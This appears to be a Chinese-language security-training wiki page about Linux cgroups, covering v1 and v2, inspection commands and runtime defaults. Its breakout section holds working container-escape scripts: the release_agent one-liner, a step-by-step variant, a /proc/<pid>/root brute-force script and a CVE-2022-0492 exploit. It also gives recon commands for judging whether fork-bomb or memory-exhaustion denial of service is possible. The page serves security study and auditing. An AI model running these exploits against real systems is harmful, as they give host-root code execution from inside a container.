# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux **control groups** 是内核中用于将进程分组，以实现计费、限制、优先级管理和策略执行的机制。如果说 namespaces 主要用于隔离资源的视图，那么 cgroups 主要用于管理一组进程可以消耗这些资源的**数量**，并且在某些情况下，还用于管理它们是否可以与**某些类别的资源**交互。Containers 始终依赖 cgroups，即使用户从未直接查看过它们，因为几乎所有现代 runtime 都需要一种方式告诉内核：“这些进程属于这个 workload，并且以下资源规则适用于它们。”

因此，container engines 会将新 container 放入其独立的 cgroup 子树中。进程树进入其中后，runtime 就可以限制内存、限制 PID 数量、调整 CPU 使用权重、调节 I/O，并限制设备访问。在生产环境中，这对于 multi-tenant 安全和基本的运维卫生都至关重要。没有有效资源控制的 container 可能耗尽内存、创建大量进程，或独占 CPU 和 I/O，从而导致 host 或相邻 workload 变得不稳定。

从安全角度来看，cgroups 有两个不同方面的重要性。首先，错误或缺失的资源限制会直接导致 denial-of-service 攻击。其次，某些 cgroup 功能，尤其是旧版 **cgroup v1** 环境中的功能，在过去曾经构成强大的 breakout 原语，前提是它们可以从 container 内部写入。

## v1 与 v2

目前主要存在两种 cgroup 模型。**cgroup v1** 暴露了多个 controller hierarchy，较早的 exploit writeup 通常围绕其中奇怪且有时权限过大的语义展开。**cgroup v2** 引入了更加统一的 hierarchy，并且通常具有更清晰的行为。现代 distributions 越来越倾向于使用 cgroup v2，但混合或 legacy 环境仍然存在，这意味着在审查真实系统时，两种模型仍然相关。

这种差异很重要，因为一些最著名的 container breakout 故事，例如滥用 cgroup v1 中的 **`release_agent`**，与旧版 cgroup 的行为有非常具体的关联。读者如果在 blog 上看到一个 cgroup exploit，然后盲目地将其应用到仅使用现代 cgroup v2 的系统上，很可能会误判目标实际上能够实现什么。

## 检查

查看当前 shell 所处位置的最快方法是：
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` 文件显示与当前进程关联的 cgroup 路径。在现代 cgroup v2 主机上，通常可以看到一个 unified 条目。在较旧或 hybrid 主机上，可能会看到多个 v1 controller 路径。确定路径后，可以检查 `/sys/fs/cgroup` 下对应的文件，以查看限制和当前使用量。

在 cgroup v2 主机上，以下命令很有用：
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
这些文件会显示哪些 controllers 存在，以及哪些 controllers 被委派给了子 cgroups。在 rootless 和 systemd-managed 环境中，这种委派模型非常重要，因为 runtime 可能只能控制父层级实际委派的那部分 cgroup 功能。

## Lab

在实践中观察 cgroups 的一种方法是运行一个受内存限制的 container：
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
你还可以尝试一个受 PID 限制的容器：
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
这些示例很有用，因为它们帮助建立 runtime flag 与 kernel file interface 之间的联系。runtime 并不是凭空强制执行规则；它会写入相关的 cgroup settings，然后让 kernel 针对整个 process tree 强制执行这些设置。

## Runtime 使用

Docker、Podman、containerd 和 CRI-O 在正常运行中都依赖 cgroups。它们之间的差异通常不在于是否使用 cgroups，而在于**选择哪些默认值**、**如何与 systemd 交互**、**rootless delegation 如何工作**，以及**有多少配置由 engine level 控制、又有多少由 orchestration level 控制**。

在 Kubernetes 中，resource requests 和 limits 最终会转换为 node 上的 cgroup configuration。从 Pod YAML 到 kernel enforcement 的路径会经过 kubelet、CRI runtime 和 OCI runtime，但 cgroups 仍然是 kernel 最终应用规则的机制。在 Incus/LXC 环境中，cgroups 也被大量使用，尤其是因为 system containers 通常会暴露更丰富的 process tree，并具有更接近 VM 的 operational expectations。

## Misconfigurations And Breakouts

经典的 cgroup security 故事是可写的 **cgroup v1 `release_agent`** 机制。在该模型中，如果 attacker 能够写入正确的 cgroup files、启用 `notify_on_release`，并控制存储在 `release_agent` 中的路径，那么当 cgroup 变为空时，kernel 最终可能会在 host 的 initial namespaces 中执行 attacker 选择的路径。这就是为什么较早的 writeups 如此重视 cgroup controller writability、mount options 以及 namespace/capability conditions。

即使 `release_agent` 不可用，cgroup 配置错误仍然很重要。过于宽泛的 device access 可能使 host devices 能够从 container 中访问。缺少 memory 和 PID limits 可能将简单的 code execution 变成 host DoS。rootless 场景中薄弱的 cgroup delegation 也可能误导 defenders，使其以为某项 restriction 存在，而实际上 runtime 从未真正能够应用该 restriction。

### `release_agent` Background

`release_agent` technique 仅适用于 **cgroup v1**。其基本思路是：当 cgroup 中的最后一个 process 退出，且设置了 `notify_on_release=1` 时，kernel 会执行存储在 `release_agent` 中的路径所指向的 program。该执行发生在 **host 的 initial namespaces 中**，这正是可写的 `release_agent` 会变成 container escape primitive 的原因。

要使该 technique 生效，attacker 通常需要：

- 一个可写的 **cgroup v1** hierarchy
- 创建或使用 child cgroup 的能力
- 设置 `notify_on_release` 的能力
- 将路径写入 `release_agent` 的能力
- 一个从 host 视角解析为 executable 的路径

### Classic PoC

历史上的 one-liner PoC 是：
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
此 PoC 将 payload 路径写入 `release_agent`，触发 cgroup release，然后读取主机上生成的输出文件。

### 易读的操作步骤

将相同思路拆分为以下步骤后，更容易理解。

1. 创建并准备一个可写的 cgroup：
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. 确定与容器文件系统对应的主机路径：
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. 放置一个可从主机路径访问到的 payload：
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. 通过使 cgroup 为空来触发执行：
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
其效果是以 host root 权限在主机端执行 payload。在真实 exploit 中，payload 通常会写入 proof file、生成 reverse shell，或修改主机状态。

### 使用 `/proc/<pid>/root` 的相对路径变体

在某些环境中，容器文件系统对应的主机路径并不明显，或者被 storage driver 隐藏。在这种情况下，可以通过 `/proc/<pid>/root/...` 表示 payload 路径，其中 `<pid>` 是当前容器中某个进程所属的 host PID。这正是相对路径 brute-force 变体的基础：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
这里相关的 trick 并不是 brute force 本身，而是路径形式：`/proc/<pid>/root/...` 允许 kernel 从 host namespace 中解析 container filesystem 内的文件，即使事先不知道直接的 host storage path。

### CVE-2022-0492 Variant

2022 年，CVE-2022-0492 表明，在 cgroup v1 中，向 `release_agent` 写入内容时，没有正确检查 **initial** user namespace 中的 `CAP_SYS_ADMIN`。这使得该技术在存在漏洞的 kernel 上更容易实现，因为能够挂载 cgroup hierarchy 的 container process 可以写入 `release_agent`，而无需事先在 host user namespace 中拥有 privileged 权限。

最小 exploit：
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
在存在漏洞的 kernel 上，host 会以 host root 权限执行 `/proc/self/exe`。

对于实际利用，首先检查环境是否仍暴露可写的 cgroup-v1 路径或危险的 device 访问权限：
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
如果 `release_agent` 存在且可写，你就已经进入 legacy-breakout 的范畴：
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
如果 cgroup 路径本身无法实现逃逸，下一种实用用途通常是拒绝服务或侦察：
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
这些命令可以快速判断 workload 是否有空间运行 fork-bomb、激进地消耗内存，或滥用可写的 legacy cgroup interface。

## 检查

检查目标时，cgroup 检查的目的是了解正在使用哪种 cgroup model、container 是否能看到可写的 controller paths，以及诸如 `release_agent` 之类的旧式 breakout primitives 是否真的相关。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
这里有什么值得关注：

- 如果 `mount | grep cgroup` 显示 **cgroup v1**，那么较早的 breakout writeup 会更具参考价值。
- 如果存在 `release_agent` 且可以访问，那么这立即值得进行更深入的调查。
- 如果可见的 cgroup hierarchy 可写，同时 container 还具有强大的 capabilities，那么该环境值得进行更仔细的审查。

如果你发现 **cgroup v1**、可写的 controller mounts，以及同时具备强大 capabilities 或较弱 seccomp/AppArmor 防护的 container，那么这种组合值得特别关注。cgroups 通常被视为枯燥的资源管理主题，但从历史上看，它们曾参与过一些最具启发性的 container escape chains，原因恰恰在于“资源控制”和“对 host 的影响”之间的边界，并不总像人们假设的那样清晰。

## Runtime 默认配置

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认启用 | Containers 会自动被置于 cgroups 中；除非通过 flags 设置，否则 resource limits 是可选的 | 省略 `--memory`、`--pids-limit`、`--cpus`、`--blkio-weight`；`--device`；`--privileged` |
| Podman | 默认启用 | `--cgroups=enabled` 是默认值；cgroup namespace 的默认值取决于 cgroup version（cgroup v2 中为 `private`，某些 cgroup v1 设置中为 `host`） | `--cgroups=disabled`、`--cgroupns=host`、放宽 device access、`--privileged` |
| Kubernetes | 默认通过 runtime 启用 | Pods 和 containers 会被 node runtime 置于 cgroups 中；细粒度的 resource control 取决于 `resources.requests` / `resources.limits` | 省略 resource requests/limits、privileged device access、host-level runtime misconfiguration |
| containerd / CRI-O | 默认启用 | cgroups 是正常 lifecycle management 的一部分 | 直接修改 runtime configs，以放宽 device controls 或暴露 legacy writable cgroup v1 interfaces |

重要区别在于，**cgroup 的存在**通常是默认行为，而**有用的 resource constraints** 往往是可选的，除非明确进行配置。
{{#include ../../../../banners/hacktricks-training.md}}
